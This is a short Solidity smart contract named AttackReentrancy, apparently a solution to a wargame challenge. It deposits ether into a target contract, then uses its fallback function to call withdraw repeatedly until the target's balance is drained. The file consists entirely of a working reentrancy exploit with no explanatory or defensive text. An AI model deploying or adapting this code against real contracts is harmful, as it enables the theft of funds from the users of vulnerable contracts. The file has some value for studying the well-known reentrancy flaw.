// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./interfaces/IReentrance.sol";

contract AttackReentrancy {
    constructor(address _reentrance) public {
        reentrance = _reentrance;
    }

    address public reentrance;
    uint256 public constant amount = 1000000000000000 wei;

    function sendFund() external payable {
        // IReentrance(reentrance).donate{value: amount}(address(this));
        (bool sent,) = reentrance.call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        require(sent, "Send failed");
    }

    function attackWithdraw() external {
        // IReentrance(reentrance).withdraw(amount);
        (bool withdraw,) = reentrance.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(withdraw, "withdraw failed");
    }

    fallback() external payable {
        if (reentrance.balance >= amount) {
            // IReentrance(reentrance).withdraw(amount);
            (bool withdraw,) = reentrance.call(abi.encodeWithSignature("withdraw(uint256)", amount));
            require(withdraw, "withdraw failed");
        }
    }
}
